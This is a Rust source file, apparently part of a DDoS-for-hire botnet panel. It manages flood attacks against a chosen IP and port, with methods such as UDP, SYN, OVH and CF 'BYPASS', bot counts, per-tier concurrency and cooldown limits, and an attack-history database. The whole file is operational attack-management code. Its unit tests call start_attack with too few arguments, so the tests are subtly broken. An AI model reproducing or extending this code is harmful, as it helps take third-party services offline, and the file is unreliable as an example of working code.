use std::time::{Duration, Instant};
use serde::{Deserialize, Serialize};
use std::net::IpAddr;
use tokio::sync::{Mutex, Notify};
use std::sync::Arc;
use dashmap::DashMap;
use super::auth::Level;
use sqlx::{SqlitePool, Row};
use tracing::error;

pub const VALID_ATTACK_METHODS: &[&str] = &[
    "UDP", "TCP", "HTTP", "SYN", "ACK", "STD", "VSE", "OVH", "NFO", "BYPASS", "TLS", "CF",
];

#[derive(Debug, Clone)]
pub struct Attack {
    pub id: i64,
    pub method: String,
    pub ip: IpAddr,
    pub port: u16,
    pub duration: Duration,
    pub start: Instant,
    pub username: String,
    #[allow(dead_code)]
    pub bot_count: usize,
}

impl Attack {
    pub fn remaining_duration(&self) -> Duration {
        self.duration.saturating_sub(self.start.elapsed())
    }
    
    pub fn is_finished(&self) -> bool {
        self.start.elapsed() >= self.duration
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackHistory {
    pub id: i64,
    pub method: String,
    pub ip: String,
    pub port: u16,
    pub duration_secs: u64,
    pub username: String,
    pub started_at: String,
    pub finished: bool,
}

#[derive(Debug, Clone)]
pub struct AttackRequest {
    pub method: String,
    pub ip: IpAddr,
    pub port: u16,
    pub duration_secs: u64,
    pub username: String,
    pub user_level: Level,
    pub bot_count: usize,
    #[allow(dead_code)]
    pub queued_at: Instant,
}

pub struct AttackManager {
    attacks: Arc<DashMap<i64, Attack>>,
    queue: Arc<Mutex<Vec<AttackRequest>>>,
    queue_notify: Arc<Notify>,
    pool: SqlitePool,
    max_attacks: usize,
    cooldown_secs: u64,
    max_duration_secs: u64,
    user_last_attack: Arc<DashMap<String, Instant>>,
    start_lock: Mutex<()>,
}

impl AttackManager {
    pub fn new(max_attacks: usize, cooldown_secs: u64, max_duration_secs: u64, pool: SqlitePool) -> Self {
        Self {
            attacks: Arc::new(DashMap::new()),
            queue: Arc::new(Mutex::new(Vec::new())),
            queue_notify: Arc::new(Notify::new()),
            pool,
            max_attacks,
            cooldown_secs,
            max_duration_secs,
            user_last_attack: Arc::new(DashMap::new()),
            start_lock: Mutex::new(()),
        }
    }
    
    #[allow(dead_code)]
    pub async fn can_start_attack(&self, username: &str, user_level: Level) -> Result<(), String> {
        // This method is now just a pre-check, actual enforcement happens in start_attack
        let count = self.attacks.len();
        
        // Check global limit
        if count >= self.max_attacks {
            return Err(format!("Maximum concurrent attacks reached: {}/{}", count, self.max_attacks));
        }
        
        // Check per-user concurrent attack limit based on level
        let user_attack_count = self.attacks.iter().filter(|a| a.username == username).count();
        let max_user_attacks = match user_level {
            Level::Owner => 10,
            Level::Admin => 5,
            Level::Pro => 3,
            Level::Basic => 1,
        };
        
        if user_attack_count >= max_user_attacks {
            return Err(format!(
                "Maximum concurrent attacks for your level ({}): {}/{}",
                user_level.to_str(),
                user_attack_count,
                max_user_attacks
            ));
        }
        
        // Check per-user cooldown with level-based timing
        let cooldown_secs = match user_level {
            Level::Owner => 0,
            Level::Admin => self.cooldown_secs / 4,
            Level::Pro => self.cooldown_secs / 2,
            Level::Basic => self.cooldown_secs,
        };
        
        if cooldown_secs > 0 {
            if let Some(last_attack) = self.user_last_attack.get(username) {
                let elapsed = last_attack.elapsed().as_secs();
                if elapsed < cooldown_secs {
                    let remaining = cooldown_secs - elapsed;
                    return Err(format!(
                        "Attack cooldown active. Please wait {} seconds before starting another attack.",
                        remaining
                    ));
                }
            }
        }
        
        Ok(())
    }
    
    pub async fn start_attack(
        &self,
        method: String,
        ip: IpAddr,
        port: u16,
        duration_secs: u64,
        username: String,
        user_level: Level,
        bot_count: usize,
    ) -> Result<usize, String> {
        // Validate duration
        if duration_secs > self.max_duration_secs {
            return Err(format!("Attack duration exceeds maximum allowed: {}s > {}s", duration_secs, self.max_duration_secs));
        }

        // Validate method
        let normalized_method = method.to_uppercase();
        if !VALID_ATTACK_METHODS.contains(&normalized_method.as_str()) {
            return Err(format!("Invalid attack method: {}", method));
        }

        // Atomic check and reservation
        {
            let _lock = self.start_lock.lock().await;
            
            // Re-check limits inside lock
            let count = self.attacks.len();
            if count >= self.max_attacks {
                return Err(format!("Maximum concurrent attacks reached: {}/{}", count, self.max_attacks));
            }
            
            let user_attack_count = self.attacks.iter().filter(|a| a.username == username).count();
            let max_user_attacks = match user_level {
                Level::Owner => 10,
                Level::Admin => 5,
                Level::Pro => 3,
                Level::Basic => 1,
            };
            
            if user_attack_count >= max_user_attacks {
                return Err(format!(
                    "Maximum concurrent attacks for your level ({}): {}/{}",
                    user_level.to_str(),
                    user_attack_count,
                    max_user_attacks
                ));
            }
            
            // Check cooldown
            let cooldown_secs = match user_level {
                Level::Owner => 0,
                Level::Admin => self.cooldown_secs / 4,
                Level::Pro => self.cooldown_secs / 2,
                Level::Basic => self.cooldown_secs,
            };
            
            if cooldown_secs > 0 {
                if let Some(last_attack) = self.user_last_attack.get(&username) {
                    let elapsed = last_attack.elapsed().as_secs();
                    if elapsed < cooldown_secs {
                        let remaining = cooldown_secs - elapsed;
                        return Err(format!(
                            "Attack cooldown active. Please wait {} seconds before starting another attack.",
                            remaining
                        ));
                    }
                }
            }
            
            let ip_str = ip.to_string();
            let now = chrono::Utc::now();

            // Use a transaction for DB safety
            let mut tx = self.pool.begin().await.map_err(|e| format!("Database error: {}", e))?;

            let id = sqlx::query("INSERT INTO attacks (username, target_ip, target_port, method, duration, started_at, status, bot_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
                .bind(&username)
                .bind(&ip_str)
                .bind(port)
                .bind(&method)
                .bind(duration_secs as i64)
                .bind(now)
                .bind("running")
                .bind(bot_count as i64)
                .execute(&mut *tx)
                .await
                .map_err(|e| format!("Database error: {}", e))?
                .last_insert_rowid();
            
            tx.commit().await.map_err(|e| format!("Database commit error: {}", e))?;

            let attack = Attack {
                id,
                method: method.clone(),
                ip,
                port,
                duration: Duration::from_secs(duration_secs),
                start: Instant::now(),
                username: username.clone(),
                bot_count,
            };
            
            self.attacks.insert(id, attack);
            
            // Record this attack for user cooldown
            self.user_last_attack.insert(username.clone(), Instant::now());
            
            Ok(id as usize)
        }
    }
    
    pub async fn queue_attack(
        &self,
        method: String,
        ip: IpAddr,
        port: u16,
        duration_secs: u64,
        username: String,
        user_level: Level,
        bot_count: usize,
    ) -> Result<usize, String> {
        // Validate duration
        if duration_secs > self.max_duration_secs {
            return Err(format!("Attack duration exceeds maximum allowed: {}s > {}s", duration_secs, self.max_duration_secs));
        }

        let mut queue = self.queue.lock().await;
        if queue.len() >= 50 {
            return Err("Queue is full".to_string());
        }

        queue.push(AttackRequest {
            method,
            ip,
            port,
            duration_secs,
            username,
            user_level,
            bot_count,
            queued_at: Instant::now(),
        });

        // Notify queue processor
        self.queue_notify.notify_one();

        Ok(queue.len())
    }

    pub async fn get_queue_items(&self) -> Vec<AttackRequest> {
        self.queue.lock().await.clone()
    }

    #[allow(dead_code)]
    pub async fn get_queue_size(&self) -> usize {
        self.queue.lock().await.len()
    }

    pub async fn wait_for_queue(&self) {
        self.queue_notify.notified().await;
    }

    pub async fn process_queue(&self) -> Option<AttackRequest> {
        let mut queue = self.queue.lock().await;
        if !queue.is_empty() && self.attacks.len() < self.max_attacks {
            Some(queue.remove(0))
        } else {
            None
        }
    }

    pub async fn stop_attack(&self, attack_id: usize) -> Result<(), String> {
        let id = attack_id as i64;
        if self.attacks.remove(&id).is_some() {
            let now = chrono::Utc::now();
            if let Err(e) = sqlx::query("UPDATE attacks SET status = 'finished', finished_at = ? WHERE id = ?")
                .bind(now)
                .bind(id)
                .execute(&self.pool)
                .await 
            {
                error!("Failed to update attack status in DB for attack {}: {}", id, e);
            }
            Ok(())
        } else {
            Err(format!("Attack {} not found", attack_id))
        }
    }

    pub async fn stop_all_attacks(&self) -> Vec<usize> {
        let mut stopped_ids = Vec::new();
        
        // Collect IDs to remove
        let ids: Vec<i64> = self.attacks.iter().map(|a| *a.key()).collect();
        
        for id in ids {
            if self.attacks.remove(&id).is_some() {
                stopped_ids.push(id as usize);
                let now = chrono::Utc::now();
                if let Err(e) = sqlx::query("UPDATE attacks SET status = 'finished', finished_at = ? WHERE id = ?")
                    .bind(now)
                    .bind(id)
                    .execute(&self.pool)
                    .await
                {
                    error!("Failed to update attack status in DB for attack {}: {}", id, e);
                }
            }
        }
        
        stopped_ids
    }
    
    pub async fn get_attack(&self, attack_id: usize) -> Option<Attack> {
        self.attacks.get(&(attack_id as i64)).map(|a| a.clone())
    }
    
    pub async fn get_all_attacks(&self) -> Vec<Attack> {
        self.attacks.iter().map(|a| a.clone()).collect()
    }
    
    pub async fn get_user_attacks(&self, username: &str) -> Vec<Attack> {
        self.attacks
            .iter()
            .filter(|a| a.username == username)
            .map(|a| a.clone())
            .collect()
    }
    
    pub async fn get_history(&self, limit: usize) -> Vec<AttackHistory> {
        let rows = match sqlx::query("SELECT id, method, target_ip, target_port, duration, username, started_at, status FROM attacks ORDER BY started_at DESC LIMIT ?")
            .bind(limit as i64)
            .fetch_all(&self.pool)
            .await 
        {
            Ok(rows) => rows,
            Err(e) => {
                error!("Failed to fetch attack history: {}", e);
                return Vec::new();
            }
        };

        rows.into_iter().map(|row| {
            let status: String = row.get("status");
            let started_at: chrono::DateTime<chrono::Utc> = row.get("started_at");
            AttackHistory {
                id: row.get("id"),
                method: row.get("method"),
                ip: row.get("target_ip"),
                port: row.get("target_port"),
                duration_secs: row.get::<i64, _>("duration") as u64,
                username: row.get("username"),
                started_at: started_at.to_rfc3339(),
                finished: status == "finished",
            }
        }).collect()
    }
    
    pub async fn cleanup_finished(&self) {
        let finished_ids: Vec<i64> = self.attacks
            .iter()
            .filter(|a| a.is_finished())
            .map(|a| a.id)
            .collect();
        
        for id in finished_ids {
            self.attacks.remove(&id);
            let now = chrono::Utc::now();
            if let Err(e) = sqlx::query("UPDATE attacks SET status = 'finished', finished_at = ? WHERE id = ?")
                .bind(now)
                .bind(id)
                .execute(&self.pool)
                .await
            {
                error!("Failed to update attack status in DB for attack {}: {}", id, e);
            }
        }
    }
    
    pub async fn get_active_count(&self) -> usize {
        self.attacks.len()
    }
    
    pub async fn cleanup_stale_attacks(&self) {
        if let Err(e) = sqlx::query("UPDATE attacks SET status = 'interrupted', finished_at = CURRENT_TIMESTAMP WHERE status = 'running'")
            .execute(&self.pool)
            .await
        {
            error!("Failed to cleanup stale attacks: {}", e);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::Ipv4Addr;
    use sqlx::sqlite::SqlitePoolOptions;

    async fn setup_test_db() -> SqlitePool {
        let pool = SqlitePoolOptions::new()
            .connect("sqlite::memory:")
            .await
            .expect("Failed to create test database");

        sqlx::query(
            r#"
            CREATE TABLE attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                method TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER NOT NULL,
                duration INTEGER NOT NULL,
                username TEXT NOT NULL,
                started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                finished_at DATETIME,
                status TEXT DEFAULT 'running',
                bot_count INTEGER DEFAULT 0
            );
            "#
        )
        .execute(&pool)
        .await
        .expect("Failed to create schema");

        pool
    }

    #[tokio::test]
    async fn test_attack_manager_lifecycle() {
        let pool = setup_test_db().await;
        let manager = AttackManager::new(10, 60, 300, pool);
        let ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
        
        // Start attack
        let result = manager.start_attack(
            "UDP".to_string(),
            ip,
            80,
            30,
            "test_user".to_string(),
            5
        ).await;
        
        assert!(result.is_ok());
        let attack_id = result.unwrap();
        
        // Check active count
        assert_eq!(manager.get_active_count().await, 1);
        
        // Check attack details
        let attack = manager.get_attack(attack_id).await;
        assert!(attack.is_some());
        let attack = attack.unwrap();
        assert_eq!(attack.method, "UDP");
        assert_eq!(attack.username, "test_user");
        
        // Stop attack
        let stop_result = manager.stop_attack(attack_id).await;
        assert!(stop_result.is_ok());
        
        // Check active count
        assert_eq!(manager.get_active_count().await, 0);
        
        // Check history
        let history = manager.get_history(10).await;
        assert_eq!(history.len(), 1);
        assert!(history[0].finished);
    }

    #[tokio::test]
    async fn test_attack_limits() {
        let pool = setup_test_db().await;
        let manager = AttackManager::new(2, 60, 300, pool);
        let ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
        
        // Fill capacity
        let _ = manager.start_attack("UDP".to_string(), ip, 80, 30, "user1".to_string(), 1).await;
        let _ = manager.start_attack("UDP".to_string(), ip, 80, 30, "user2".to_string(), 1).await;
        
        // Try to exceed capacity
        let result = manager.can_start_attack("user3", Level::Admin).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_invalid_method() {
        let pool = setup_test_db().await;
        let manager = AttackManager::new(10, 60, 300, pool);
        let ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
        
        let result = manager.start_attack(
            "INVALID_METHOD".to_string(),
            ip,
            80,
            30,
            "user1".to_string(),
            1
        ).await;
        
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_attack_duration_limit() {
        let pool = setup_test_db().await;
        let manager = AttackManager::new(10, 60, 100, pool); // Max duration 100s
        let ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
        
        // Try to start attack with duration > max
        let result = manager.start_attack(
            "UDP".to_string(),
            ip,
            80,
            101, // Exceeds 100
            "user1".to_string(),
            1
        ).await;
        
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Attack duration exceeds maximum allowed"));
        
        // Try valid duration
        let result = manager.start_attack(
            "UDP".to_string(),
            ip,
            80,
            100, // Exact max
            "user1".to_string(),
            1
        ).await;
        
        assert!(result.is_ok());
    }
}
